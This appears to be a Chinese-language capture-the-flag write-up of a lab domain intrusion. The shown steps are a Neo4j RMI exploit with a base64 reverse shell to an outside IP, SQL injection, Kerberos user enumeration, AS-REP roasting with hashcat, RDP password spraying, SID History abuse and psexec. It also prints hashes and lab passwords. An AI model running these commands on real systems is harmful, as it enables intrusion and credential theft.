---
title: "春秋云镜 Time Writeup"
date: 2023-08-02T17:39:08+08:00
lastmod: 2023-08-02T17:39:08+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'domain', 'kerberos']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Time Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.147.58 -p 1-65535
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.147.58    is alive
[*] Icmp alive hosts len is: 1
39.99.147.58:22 open
39.99.147.58:1337 open
39.99.147.58:7474 open
39.99.147.58:7473 open
39.99.147.58:7687 open
39.99.147.58:46881 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle: http://39.99.147.58:7474  code:303 len:0      title:None 跳转url: http://39.99.147.58:7474/browser/
[*] WebTitle: http://39.99.147.58:7474/browser/ code:200 len:3279   title:Neo4j Browser
[*] WebTitle: https://39.99.147.58:7687 code:400 len:50     title:None
[*] WebTitle: https://39.99.147.58:7473 code:303 len:0      title:None 跳转url: https://39.99.147.58:7473/browser/
[*] WebTitle: https://39.99.147.58:7473/browser/ code:200 len:3279   title:Neo4j Browser
```

neo4j 数据库, 一眼 CVE-2021-34371

[https://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/README.zh-cn.md)

刚开始打的时候一直 no route to host, 重置一次靶机之后就好了

```shell
$ java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi://39.98.116.132:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy43MC4yMzAvNjU0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
Trying to enumerate server bindings:
Found binding: shell
[+] Found valid binding, proceeding to exploit
[+] Caught an unmarshalled exception, this is expected.
RemoteException occurred in server thread; nested exception is:
	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
	java.io.IOException
[+] Exploit completed
```

反弹 shell, 收集信息

```shell
neo4j@ubuntu:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe1b:86a  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:1b:08:6a  txqueuelen 1000  (Ethernet)
        RX packets 29579  bytes 42560747 (42.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6962  bytes 640212 (640.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 514  bytes 43396 (43.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 514  bytes 43396 (43.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

内核版本

```shell
neo4j@ubuntu:/tmp$ uname -a
uname -a
Linux ubuntu 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

linux exploit suggester

```shell
Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
```

以为要提权的, 然后折腾了一会才发现 flag01 就在 neo4j 用户的家目录下...

![image-20230802145301346](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021453403.png)

## flag02

内网 fscan

```shell
neo4j@ubuntu:~$ ./fscan -h 172.22.6.0/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.6.12     is alive
(icmp) Target 172.22.6.36     is alive
(icmp) Target 172.22.6.25     is alive
(icmp) Target 172.22.6.38     is alive
[*] Icmp alive hosts len is: 4
172.22.6.25:135 open
172.22.6.12:135 open
172.22.6.38:80 open
172.22.6.38:22 open
172.22.6.36:22 open
172.22.6.12:88 open
172.22.6.25:139 open
172.22.6.12:139 open
172.22.6.25:445 open
172.22.6.12:445 open
172.22.6.36:7687 open
[*] alive ports len is: 11
start vulscan
[*] NetInfo:
[*]172.22.6.12
   [->]DC-PROGAME
   [->]172.22.6.12
[*] NetBios: 172.22.6.25     XIAORANG\WIN2019               
[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)
[*] NetInfo:
[*]172.22.6.25
   [->]WIN2019
   [->]172.22.6.25
[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:后台登录
[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393 
[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None
已完成 11/11
[*] 扫描结束,耗时: 15.705395892s
```

整理信息

```shell
172.22.6.12 DC-PROGAME
172.22.6.25 WIN2019
172.22.6.36 本机
172.22.6.38 Linux
```

先看 172.22.6.38

![image-20230802145858642](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021458684.png)

跑了一下弱口令没结果, 但是存在 sql 注入

![image-20230802150439389](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021504422.png)

dump flag02

![image-20230802150532217](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021505251.png)

## flag03 & flag04

收集下数据库里面的账号信息

admin 表, 但好像没啥用

```shell
Database: oa_db
Table: oa_admin
[1 entry]
+----+---------------+------------------+
| id | username      | password         |
+----+---------------+------------------+
| 1  | administrator | bo2y8kAL3HnXUiQo |
+----+---------------+------------------+
```

users 表

```shell
Table: oa_users
[500 entries]
+-----+----------------------------+-------------+-----------------+
| id  | email                      | phone       | username        |
+-----+----------------------------+-------------+-----------------+
| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |
| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |
| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |
| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |
| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |
| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |
| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |
| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |
| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |
| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |
+-----+----------------------------+-------------+-----------------+
```

一共 500 列

看到 `@xiaorang.lab` 的结尾很容易想到可能要去枚举域内用户

```shell
./kerbrute_darwin_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab ~/users.txt -o output.txt
```

![image-20230802151758223](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021517257.png)

最终跑出来 74 个有效用户名

```shell
2023/08/02 15:20:27 >  Done! Tested 500 usernames (74 valid) in 262.229 seconds
```

随手试下看看是否存在 AS-REP Roasting, 没想到竟然成功了 (

```shell
proxychains GetNPUsers.py -dc-ip 172.22.6.12 xiaorang.lab/ -usersfile ~/domainusers.txt
```

两组用户凭据

```shell
$krb5asrep$23$wenshao@XIAORANG.LAB:0686a04ea4ab25284668ea3139e0d11c$5c6b2614f8c7b66d1ad25ef499fcabd246b7676aed6de6876e8e444d770ea80ef82139f6e48b0393c34483688904a8f97a0e30c2eb43c12aeac534d23d23ee638f2979a037d4c0f8bf0e25caf33802068d412fa0f43b50a601753245b9e212747e3f7bce98e156a23dd15c6caa33d64b01db2e74572b8766bb6ded2a3ba27c86490a5bbbccbb87df8306d3d390ae5ef25613b257a48713ec2555c6ada9746a9c1d331e1543206110975e2fec64823f0b6ca86be8d48d16b8993b2eca97ddd9ee20aebe57405faff3bcebf03518d4b4b5f35980ca9683fccd97cebc9fb0acb4dc430b10e8357ac9b7aa472c7c

$krb5asrep$23$zhangxin@XIAORANG.LAB:0e56dc78a6414e5fcfda23cdb2f5ee25$80c1e039a992a70df829ebdd9851c111e031346a8ea4c392fe24e254f6af60a77dfd9d9e696dc58bf7380b33720e1147732629e86b3c3649c0ac4caaa2ef525ca0d7c3daad8d829653c6b8cb2998891513eb0e31762537108e7526858c6ed13d987efe7e6aaf12fd6c4e5f877441eb0dcc419a22b79b2c9374d4a8a50643d3352e67c8692ca92b5ec9b7197b1baa9b42bf0323f98deaf42a8feb581964e0ebee3feccc8393a0681bd00582cbc29fb141bbbf788c48cd9f55f49b79d703b91aa966e925f245bdf342b7c4de3b925804b7466f58e5ec1de4283a138466a337cc78b66f5e6bc725e9be0c0aaaf5
```

hashcat 跑 rockyou

```shell
hashcat -a 0 -m 18200 --force hash.txt ~/Tools/字典/rockyou.txt
```

![image-20230802152559787](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021525819.png)

```
wenshao:hellokitty
zhangxin:strawberry
```

crackmapexec 跑 rdp

```shell
$ proxychains crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab
RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)
RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)
RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\wenshao:hellokitty (Pwn3d!)
RDP         172.22.6.12     3389   DC-PROGAME       [+] xiaorang.lab\wenshao:hellokitty
```

连接

![image-20230802153718670](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021537717.png)

WinPEARS, 只贴部分输出

```shell
 [*] Enumerating installed KBs...
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [>] https://github.com/sgabe/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 12 potential vulnerabilities.

╔══════════╣ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  xiaorang.lab
    DefaultUserName               :  yuxuan
    DefaultPassword               :  Yuxuan7QbrgZ3L

╔══════════╣ Vulnerable Leaked Handlers
╚  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
    Handle: 940(file)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: TakeOwnership
    File Path: \Windows\System32
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 1620(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 1884(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\session manager
   =================================================================================================

    Handle: 2092(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\versions
   =================================================================================================

    Handle: 940(file)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: TakeOwnership
    File Path: \Windows\System32
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 1620(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 1884(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\session manager
   =================================================================================================

    Handle: 2092(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\versions
   =================================================================================================

    Handle: 940(file)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: TakeOwnership
    File Path: \Windows\System32
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 1620(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 1884(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\session manager
   =================================================================================================

    Handle: 2092(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\versions
   =================================================================================================

    Handle: 940(file)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: TakeOwnership
    File Path: \Windows\System32
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 1620(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 1884(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\session manager
   =================================================================================================

    Handle: 2092(key)
    Handle Owner: Pid is 5636(winPEASx64) with owner: wenshao
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\sorting\versions
   =================================================================================================

══════════╣ Checking WSUS
╚  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    WSUS is using http: http://update.cloud.aliyuncs.com
╚ You can test https://github.com/pimps/wsuxploit to escalate privileges
    And UseWUServer is equals to 1, so it is vulnerable!

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (XIAORANG) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges
```

有一组 AutoLogon 用户凭据

```
yuxuan:Yuxuan7QbrgZ3L
```

结合 BloodHound 的信息

![image-20230802160246577](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021602620.png)

yuxuan 用户配置了指向 `Administrator@xiaorang.lab` 的 SID History, 因此 yuxuan 用户拥有域管理员的权限

这里 DCSync 之后导出 Hash 然后 psexec + pth 好像登不上, 而且 yuxuan 用户本身 psexec 也登不上, 很怪

于是自己加了一个 Domain Admins 组的用户, 然后就能登上了

![image-20230802161549142](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021615191.png)

flag03

```shell
proxychains psexec.py xiaorang.lab/Hacker:'Hacker123!'@WIN2019.xiaorang.lab -dc-ip 172.22.6.12
```

![image-20230802161725560](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021617605.png)

看到这个提示我总感觉我是不是跳步了...

感觉正常流程好像是先本地提权?

flag04

```shell
proxychains psexec.py xiaorang.lab/Hacker:'Hacker123!'@DC-PROGAME.xiaorang.lab -dc-ip 172.22.6.12
```

![image-20230802161841652](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308021618700.png)
